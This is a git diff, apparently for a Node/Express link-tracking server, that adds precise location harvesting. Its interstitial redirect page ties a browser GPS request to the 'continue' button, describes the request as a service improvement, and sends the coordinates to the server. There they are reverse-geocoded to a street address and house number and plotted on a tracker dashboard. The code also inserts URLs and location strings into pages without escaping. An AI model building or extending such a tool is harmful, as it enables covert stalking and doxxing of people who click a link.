@@ -84,8 +84,39 @@ async function getIPInfo(ip) {
         location: 'Local (Simulado)',
         isp: 'Local Network',
         asn: 'N/A',
-        org: 'Local Network'
+        org: 'Local Network',
+        coordinates: null
       };
+    }
+    
+    // API #0: Tentar obter coordenadas diretas via abstractapi.com
+    try {
+      const apiKey = process.env.ABSTRACTAPI_KEY || ''; // Recomendável adicionar no .env
+      if (apiKey) {
+        const response = await fetch(`https://ipgeolocation.abstractapi.com/v1/?api_key=${apiKey}&ip_address=${cleanIp}`);
+        const data = await response.json();
+        
+        if (data && data.latitude && data.longitude) {
+          return {
+            ip: cleanIp,
+            location: `${data.city || ''}, ${data.region || ''}, ${data.country || ''}`.replace(', ,', ','),
+            isp: data.connection.isp || 'Desconhecido',
+            asn: data.connection.autonomous_system_number || 'Desconhecido',
+            org: data.connection.autonomous_system_organization || 'Desconhecido',
+            coordinates: {
+              latitude: data.latitude,
+              longitude: data.longitude,
+              accuracy: 'alta'
+            },
+            // Dados extras
+            timezone: data.timezone ? data.timezone.name : null,
+            currency: data.currency ? data.currency.currency_name : null,
+            continent: data.continent || null
+          };
+        }
+      }
+    } catch (error) {
+      console.log('Falha na API de geolocalização direta:', error.message);
     }
     
     // Tentar primeira API: ipapi.co
@@ -99,7 +130,14 @@ async function getIPInfo(ip) {
           location: `${data.city || ''}, ${data.region || ''}, ${data.country_name || ''}`.replace(', ,', ','),
           isp: data.org || 'Desconhecido',
           asn: data.asn || 'Desconhecido',
-          org: data.org || 'Desconhecido'
+          org: data.org || 'Desconhecido',
+          coordinates: data.latitude && data.longitude ? {
+            latitude: data.latitude,
+            longitude: data.longitude,
+            accuracy: 'média'
+          } : null,
+          timezone: data.timezone || null,
+          currency: data.currency || null
         };
       }
     } catch (error) {
@@ -112,12 +150,27 @@ async function getIPInfo(ip) {
       const data = await response.json();
       
       if (data && !data.error && data.city && data.country) {
+        // ipinfo.io retorna coordenadas como "lat,lon"
+        let coordinates = null;
+        if (data.loc) {
+          const [latitude, longitude] = data.loc.split(',');
+          if (latitude && longitude) {
+            coordinates = {
+              latitude: parseFloat(latitude),
+              longitude: parseFloat(longitude),
+              accuracy: 'média'
+            };
+          }
+        }
+        
         return {
           ip: cleanIp,
           location: `${data.city || ''}, ${data.region || ''}, ${data.country || ''}`.replace(', ,', ','),
           isp: data.org || 'Desconhecido',
           asn: data.org ? data.org.split(' ')[0] : 'Desconhecido',
-          org: data.org ? data.org.split(' ').slice(1).join(' ') : 'Desconhecido'
+          org: data.org ? data.org.split(' ').slice(1).join(' ') : 'Desconhecido',
+          coordinates: coordinates,
+          timezone: data.timezone || null
         };
       }
     } catch (error) {
@@ -135,7 +188,13 @@ async function getIPInfo(ip) {
           location: `${data.city || ''}, ${data.regionName || ''}, ${data.country || ''}`.replace(', ,', ','),
           isp: data.isp || 'Desconhecido',
           asn: data.as || 'Desconhecido',
-          org: data.org || 'Desconhecido'
+          org: data.org || 'Desconhecido',
+          coordinates: data.lat && data.lon ? {
+            latitude: data.lat,
+            longitude: data.lon,
+            accuracy: 'média'
+          } : null,
+          timezone: data.timezone || null
         };
       }
     } catch (error) {
@@ -153,7 +212,12 @@ async function getIPInfo(ip) {
           location: `${data.city || ''}, ${data.state || ''}, ${data.country_name || ''}`.replace(', ,', ','),
           isp: 'Desconhecido',
           asn: 'Desconhecido',
-          org: 'Desconhecido'
+          org: 'Desconhecido',
+          coordinates: data.latitude && data.longitude ? {
+            latitude: data.latitude,
+            longitude: data.longitude,
+            accuracy: 'baixa'
+          } : null
         };
       }
     } catch (error) {
@@ -166,14 +230,30 @@ async function getIPInfo(ip) {
       // Identificar país pelo primeiro octeto do IP (muito básico)
       const ipFirstOctet = parseInt(cleanIp.split('.')[0]);
       let location = 'Desconhecido';
+      let coordinates = null;
       
       // Mapeamento muito básico de alguns intervalos comuns
       if (ipFirstOctet >= 186 && ipFirstOctet <= 189) {
         location = 'Brasil';
+        coordinates = {
+          latitude: -15.7801, // Coordenadas aproximadas do centro do Brasil
+          longitude: -47.9292,
+          accuracy: 'muito baixa'
+        };
       } else if (ipFirstOctet >= 72 && ipFirstOctet <= 79) {
         location = 'Estados Unidos';
+        coordinates = {
+          latitude: 37.0902,  // Coordenadas aproximadas do centro dos EUA
+          longitude: -95.7129,
+          accuracy: 'muito baixa'
+        };
       } else if (ipFirstOctet >= 81 && ipFirstOctet <= 91) {
         location = 'Europa';
+        coordinates = {
+          latitude: 48.8566,  // Coordenadas aproximadas do centro da Europa
+          longitude: 2.3522,
+          accuracy: 'muito baixa'
+        };
       }
       
       return {
@@ -181,7 +261,8 @@ async function getIPInfo(ip) {
         location: location !== 'Desconhecido' ? location : 'Localização não identificada',
         isp: 'Desconhecido',
         asn: 'Desconhecido',
-        org: 'Desconhecido'
+        org: 'Desconhecido',
+        coordinates: coordinates
       };
     } catch (e) {
       // Se até isso falhar, retorne desconhecido
@@ -190,7 +271,8 @@ async function getIPInfo(ip) {
         location: 'Localização não identificada',
         isp: 'Desconhecido',
         asn: 'Desconhecido',
-        org: 'Desconhecido'
+        org: 'Desconhecido',
+        coordinates: null
       };
     }
   } catch (error) {
@@ -200,7 +282,8 @@ async function getIPInfo(ip) {
       location: 'Erro na obtenção de dados',
       isp: 'Desconhecido',
       asn: 'Desconhecido',
-      org: 'Desconhecido'
+      org: 'Desconhecido',
+      coordinates: null
     };
   }
 }
@@ -260,19 +343,253 @@ app.get('/t/:linkId', async (req, res) => {
   const ipInfo = await getIPInfo(realIP);
   const timestamp = new Date().toISOString();
   
+  // Criar ID único para este acesso
+  const accessId = uuidv4();
+  
   // Adicionar à lista de rastreamentos
   db.traces[linkId].push({
     timestamp,
     ip: realIP,
     ipInfo,
     userAgent,
-    referer: req.get('Referer') || 'Direto'
+    referer: req.get('Referer') || 'Direto',
+    accessId, // ID único para este acesso
+    preciseLocation: null // Será atualizado se o usuário permitir geolocalização
   });
   
   writeDB(db);
   
-  // Redirecionar para a URL original
-  res.redirect(db.links[linkId].targetUrl);
+  // Em vez de redirecionar diretamente, mostrar uma página intermediária que solicita permissão de localização
+  const html = `
+  <!DOCTYPE html>
+  <html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redirecionando...</title>
+    <style>
+      body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background-color: #f8f9fa;
+        color: #333;
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+        height: 100vh;
+        margin: 0;
+        padding: 20px;
+        text-align: center;
+      }
+      .container {
+        max-width: 600px;
+        background-color: white;
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 5px 20px rgba(0,0,0,0.05);
+      }
+      h1 {
+        color: #2c3e50;
+        margin-top: 0;
+      }
+      p {
+        line-height: 1.6;
+        margin-bottom: 20px;
+      }
+      .redirect-button {
+        background-color: #3498db;
+        color: white;
+        border: none;
+        padding: 12px 25px;
+        border-radius: 5px;
+        cursor: pointer;
+        font-size: 16px;
+        font-weight: 500;
+        transition: background-color 0.2s;
+        text-decoration: none;
+        display: inline-block;
+      }
+      .redirect-button:hover {
+        background-color: #2980b9;
+      }
+      .loader {
+        border: 5px solid #f3f3f3;
+        border-top: 5px solid #3498db;
+        border-radius: 50%;
+        width: 50px;
+        height: 50px;
+        animation: spin 1s linear infinite;
+        margin: 20px auto;
+        display: none;
+      }
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+      .privacy-notice {
+        font-size: 0.8em;
+        color: #7f8c8d;
+        margin-top: 20px;
+      }
+      .skip-link {
+        display: block;
+        margin-top: 15px;
+        color: #7f8c8d;
+        text-decoration: underline;
+        font-size: 0.9em;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Você será redirecionado</h1>
+      <p>Você está prestes a ser redirecionado para o link de destino.</p>
+      
+      <div id="loader" class="loader"></div>
+      
+      <button id="redirectButton" class="redirect-button">Continuar para o destino</button>
+      <a href="#" id="skipLink" class="skip-link">Pular verificação de localização</a>
+      
+      <p class="privacy-notice">Para melhorar nosso serviço de rastreamento, podemos solicitar sua localização atual com maior precisão. Isto é opcional e você pode pular esta etapa.</p>
+    </div>
+    
+    <script>
+      document.addEventListener('DOMContentLoaded', function() {
+        const redirectButton = document.getElementById('redirectButton');
+        const skipLink = document.getElementById('skipLink');
+        const loader = document.getElementById('loader');
+        const accessId = '${accessId}';
+        const linkId = '${linkId}';
+        const targetUrl = '${db.links[linkId].targetUrl}';
+        
+        redirectButton.addEventListener('click', function() {
+          loader.style.display = 'block';
+          redirectButton.style.display = 'none';
+          skipLink.style.display = 'none';
+          
+          // Tentar obter a localização precisa
+          if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+              // Sucesso
+              function(position) {
+                const preciseLocation = {
+                  latitude: position.coords.latitude,
+                  longitude: position.coords.longitude,
+                  accuracy: position.coords.accuracy,
+                  altitude: position.coords.altitude,
+                  altitudeAccuracy: position.coords.altitudeAccuracy,
+                  heading: position.coords.heading,
+                  speed: position.coords.speed,
+                  timestamp: position.timestamp
+                };
+                
+                // Enviar localização para o servidor
+                fetch('/api/update-location', {
+                  method: 'POST',
+                  headers: {
+                    'Content-Type': 'application/json'
+                  },
+                  body: JSON.stringify({
+                    linkId,
+                    accessId,
+                    preciseLocation
+                  })
+                })
+                .finally(() => {
+                  // Redirecionar para o destino após 1 segundo
+                  setTimeout(() => {
+                    window.location.href = targetUrl;
+                  }, 1000);
+                });
+              },
+              // Erro
+              function(error) {
+                console.log('Erro ao obter localização:', error.message);
+                // Redirecionar para o destino
+                window.location.href = targetUrl;
+              },
+              // Opções
+              {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+              }
+            );
+          } else {
+            // Navegador não suporta geolocalização
+            window.location.href = targetUrl;
+          }
+        });
+        
+        skipLink.addEventListener('click', function(e) {
+          e.preventDefault();
+          window.location.href = targetUrl;
+        });
+      });
+    </script>
+  </body>
+  </html>
+  `;
+  
+  res.send(html);
+});
+
+// Nova rota para atualizar a localização precisa
+app.post('/api/update-location', (req, res) => {
+  const { linkId, accessId, preciseLocation } = req.body;
+  
+  if (!linkId || !accessId || !preciseLocation) {
+    return res.status(400).json({ error: 'Parâmetros incompletos' });
+  }
+  
+  try {
+    const db = readDB();
+    
+    // Verificar se o link existe
+    if (!db.links[linkId]) {
+      return res.status(404).json({ error: 'Link não encontrado' });
+    }
+    
+    // Encontrar o acesso específico e atualizar a localização
+    const accessIndex = db.traces[linkId].findIndex(trace => trace.accessId === accessId);
+    
+    if (accessIndex !== -1) {
+      db.traces[linkId][accessIndex].preciseLocation = preciseLocation;
+      
+      // Também podemos obter informações adicionais usando as coordenadas
+      if (preciseLocation.latitude && preciseLocation.longitude) {
+        // Iniciar uma tarefa em background para obter detalhes do local
+        fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${preciseLocation.latitude}&lon=${preciseLocation.longitude}&zoom=18&addressdetails=1`)
+          .then(response => response.json())
+          .then(data => {
+            if (data && data.address) {
+              db.traces[linkId][accessIndex].addressDetails = {
+                road: data.address.road || null,
+                house_number: data.address.house_number || null,
+                neighbourhood: data.address.neighbourhood || data.address.suburb || null,
+                city: data.address.city || data.address.town || data.address.village || null,
+                state: data.address.state || null,
+                country: data.address.country || null,
+                postcode: data.address.postcode || null,
+                formatted: data.display_name || null
+              };
+              
+              writeDB(db);
+            }
+          })
+          .catch(err => {
+            console.error('Erro ao obter detalhes do endereço:', err);
+          });
+      }
+      
+      writeDB(db);
+    }
+    
+    res.json({ success: true });
+  } catch (error) {
+    console.error('Erro ao atualizar localização:', error);
+    res.status(500).json({ error: 'Erro ao processar solicitação' });
+  }
 });
 
 // Obter informações de rastreamento de um link
@@ -480,6 +797,47 @@ app.get('/info/:linkId', (req, res) => {
         color: #7f8c8d;
         font-style: italic;
       }
+      .accuracy-badge {
+        font-size: 0.8em;
+        padding: 2px 6px;
+        border-radius: 4px;
+        margin-left: 5px;
+        display: inline-block;
+      }
+      .accuracy-badge.alta {
+        background-color: #27ae60;
+        color: white;
+      }
+      .accuracy-badge.média {
+        background-color: #f39c12;
+        color: white;
+      }
+      .accuracy-badge.baixa {
+        background-color: #e74c3c;
+        color: white;
+      }
+      .accuracy-badge.muito.baixa {
+        background-color: #95a5a6;
+        color: white;
+      }
+      .precise-location {
+        background-color: #e8f6ff;
+        padding: 10px;
+        border-radius: 6px;
+        margin: 10px 0;
+        border-left: 4px solid #27ae60;
+      }
+      .precise-location p {
+        margin: 5px 0;
+      }
+      .stats-box {
+        margin-top: 10px;
+        margin-bottom: 15px;
+        padding: 10px;
+        background-color: #f8f9fa;
+        border-radius: 6px;
+        font-size: 0.9em;
+      }
     </style>
   </head>
   <body>
@@ -510,6 +868,14 @@ app.get('/info/:linkId', (req, res) => {
         <div class="stat-item">
           <span class="stat-value">${traces.length > 0 ? new Date(traces[traces.length - 1].timestamp).toLocaleDateString('pt-BR') : '-'}</span>
           <span class="stat-label">Último Acesso</span>
+        </div>
+        <div class="stat-item">
+          <span class="stat-value">${(() => {
+            // Contabilizar localizações precisas
+            const precisas = traces.filter(trace => trace.preciseLocation && trace.preciseLocation.latitude).length;
+            return precisas > 0 ? `${precisas}/${traces.length}` : '0';
+          })()}</span>
+          <span class="stat-label">Localizações Precisas</span>
         </div>
         <div class="stat-item">
           <span class="stat-value">${(() => {
@@ -573,9 +939,37 @@ app.get('/info/:linkId', (req, res) => {
               <div class="trace-details">
                 <div class="trace-details-col">
                   <p><strong>IP:</strong> ${trace.ip}</p>
-                  <p><strong>Localização:</strong> ${trace.ipInfo.location && trace.ipInfo.location !== 'Desconhecido' ? trace.ipInfo.location : 'Não foi possível determinar a localização'}</p>
+                  
+                  ${(() => {
+                    // Verificar se temos localização precisa do usuário
+                    if (trace.preciseLocation && trace.preciseLocation.latitude && trace.preciseLocation.longitude) {
+                      const precisionMeters = Math.round(trace.preciseLocation.accuracy);
+                      return `
+                        <div class="precise-location">
+                          <p><strong>Localização Exata:</strong> <span class="accuracy-badge alta">Precisão Alta</span></p>
+                          <p><strong>Coordenadas GPS:</strong> ${trace.preciseLocation.latitude.toFixed(6)}, ${trace.preciseLocation.longitude.toFixed(6)}</p>
+                          <p><strong>Precisão:</strong> ±${precisionMeters} metros</p>
+                          ${trace.addressDetails ? `
+                            <p><strong>Endereço:</strong> ${trace.addressDetails.formatted || 'Indisponível'}</p>
+                            ${trace.addressDetails.road ? `<p><strong>Rua:</strong> ${trace.addressDetails.road}${trace.addressDetails.house_number ? `, ${trace.addressDetails.house_number}` : ''}</p>` : ''}
+                            ${trace.addressDetails.neighbourhood ? `<p><strong>Bairro:</strong> ${trace.addressDetails.neighbourhood}</p>` : ''}
+                            ${trace.addressDetails.city ? `<p><strong>Cidade:</strong> ${trace.addressDetails.city}</p>` : ''}
+                          ` : ''}
+                        </div>
+                      `;
+                    } else {
+                      return `
+                        <p><strong>Localização:</strong> ${trace.ipInfo.location && trace.ipInfo.location !== 'Desconhecido' ? trace.ipInfo.location : 'Não foi possível determinar a localização'}</p>
+                        ${trace.ipInfo.coordinates ? `<p><strong>Coordenadas:</strong> ${trace.ipInfo.coordinates.latitude}, ${trace.ipInfo.coordinates.longitude} <span class="accuracy-badge ${trace.ipInfo.coordinates.accuracy}">(Precisão ${trace.ipInfo.coordinates.accuracy})</span></p>` : ''}
+                      `;
+                    }
+                  })()}
+                  
+                  ${trace.ipInfo.continent ? `<p><strong>Continente:</strong> ${trace.ipInfo.continent}</p>` : ''}
+                  ${trace.ipInfo.timezone ? `<p><strong>Fuso horário:</strong> ${trace.ipInfo.timezone}</p>` : ''}
                   <p><strong>Provedor:</strong> ${trace.ipInfo.isp && trace.ipInfo.isp !== 'Desconhecido' ? trace.ipInfo.isp : 'Informação indisponível'}</p>
                   ${trace.ipInfo.asn && trace.ipInfo.asn !== 'Desconhecido' ? `<p><strong>ASN:</strong> ${trace.ipInfo.asn}</p>` : ''}
+                  ${trace.ipInfo.currency ? `<p><strong>Moeda local:</strong> ${trace.ipInfo.currency}</p>` : ''}
                 </div>
                 <div class="trace-details-col">
                   <p class="device-info"><span class="device-icon">${deviceIcon}</span> <strong>${deviceType.charAt(0).toUpperCase() + deviceType.slice(1)}</strong></p>
@@ -612,14 +1006,88 @@ app.get('/info/:linkId', (req, res) => {
       document.addEventListener('DOMContentLoaded', function() {
         // Inicializar mapas para cada acesso
         ${traces.map((trace, index) => {
-          if (trace.ipInfo.location && 
+          // Se temos localização precisa do HTML5, usamos ela para o mapa
+          if (trace.preciseLocation && trace.preciseLocation.latitude && trace.preciseLocation.longitude) {
+            const lat = trace.preciseLocation.latitude;
+            const lon = trace.preciseLocation.longitude;
+            const accuracy = trace.preciseLocation.accuracy;
+            
+            return `
+              try {
+                const mapElement = document.getElementById('map-${index}');
+                if (mapElement) {
+                  const map${index} = L.map('map-${index}').setView([${lat}, ${lon}], 15); // Zoom maior para localização precisa
+                  L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                    attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+                  }).addTo(map${index});
+                  
+                  // Marcador para a localização exata
+                  L.marker([${lat}, ${lon}]).addTo(map${index})
+                    .bindPopup('Localização exata${trace.addressDetails && trace.addressDetails.formatted ? '<br>' + trace.addressDetails.formatted : ''}')
+                    .openPopup();
+                  
+                  // Círculo de precisão
+                  L.circle([${lat}, ${lon}], {
+                    color: '#3498db',
+                    fillColor: '#3498db',
+                    fillOpacity: 0.15,
+                    radius: ${accuracy}
+                  }).addTo(map${index});
+                }
+              } catch (e) {
+                console.error('Erro ao processar mapa com geolocalização HTML5:', e);
+                const mapElement = document.getElementById('map-${index}');
+                if (mapElement) {
+                  mapElement.innerHTML = '<p style="padding: 15px; text-align: center;">Erro ao carregar o mapa.</p>';
+                }
+              }
+            `;
+          }
+          // Caso contrário, verificamos se temos coordenadas do IP
+          else if (trace.ipInfo.location && 
               trace.ipInfo.location !== 'Local (Simulado)' && 
               trace.ipInfo.location !== 'Desconhecido' && 
               trace.ipInfo.location !== 'Localização não identificada' && 
               trace.ipInfo.location !== 'Erro na obtenção de dados') {
             
+            // Se temos coordenadas diretas, usamos elas para o mapa
+            if (trace.ipInfo.coordinates && trace.ipInfo.coordinates.latitude && trace.ipInfo.coordinates.longitude) {
+              return `
+                try {
+                  const mapElement = document.getElementById('map-${index}');
+                  if (mapElement) {
+                    const map${index} = L.map('map-${index}').setView([${trace.ipInfo.coordinates.latitude}, ${trace.ipInfo.coordinates.longitude}], 6);
+                    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                      attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
+                    }).addTo(map${index});
+                    
+                    const accuracyMessage = '${trace.ipInfo.coordinates.accuracy ? `Precisão ${trace.ipInfo.coordinates.accuracy}` : ''}';
+                    const marker = L.marker([${trace.ipInfo.coordinates.latitude}, ${trace.ipInfo.coordinates.longitude}]).addTo(map${index})
+                      .bindPopup('${trace.ipInfo.location.replace(/'/g, "\\'")}' + (accuracyMessage ? '<br><small>' + accuracyMessage + '</small>' : ''))
+                      .openPopup();
+                      
+                    ${trace.ipInfo.coordinates.accuracy === 'alta' ? `
+                    // Se a precisão for alta, adicionamos um círculo de proximidade
+                    L.circle([${trace.ipInfo.coordinates.latitude}, ${trace.ipInfo.coordinates.longitude}], {
+                      color: 'blue',
+                      fillColor: '#3498db',
+                      fillOpacity: 0.1,
+                      radius: 500
+                    }).addTo(map${index});
+                    ` : ''}
+                  }
+                } catch (e) {
+                  console.error('Erro ao processar mapa com coordenadas diretas:', e);
+                  const mapElement = document.getElementById('map-${index}');
+                  if (mapElement) {
+                    mapElement.innerHTML = '<p style="padding: 15px; text-align: center;">Erro ao carregar o mapa.</p>';
+                  }
+                }
+              `;
+            }
+            
+            // Caso contrário, usamos a busca por localização como antes
             // Preparar a consulta para o serviço de geocodificação
-            // Se tivermos apenas o nome do país, usamos apenas ele
             let searchQuery = trace.ipInfo.location;
             
             // Se a localização contém apenas um nome sem vírgulas, adicionamos a palavra "país" para melhorar a busca
@@ -639,8 +1107,9 @@ app.get('/info/:linkId', (req, res) => {
                         L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                           attribution: '&copy; <a href="https://www.openstreetmap.org/copyright">OpenStreetMap</a> contributors'
                         }).addTo(map${index});
+                        
                         L.marker([data[0].lat, data[0].lon]).addTo(map${index})
-                          .bindPopup('${trace.ipInfo.location.replace(/'/g, "\\'")}')
+                          .bindPopup('${trace.ipInfo.location.replace(/'/g, "\\'")} <br><small>Localização aproximada</small>')
                           .openPopup();
                       }
                     } else {
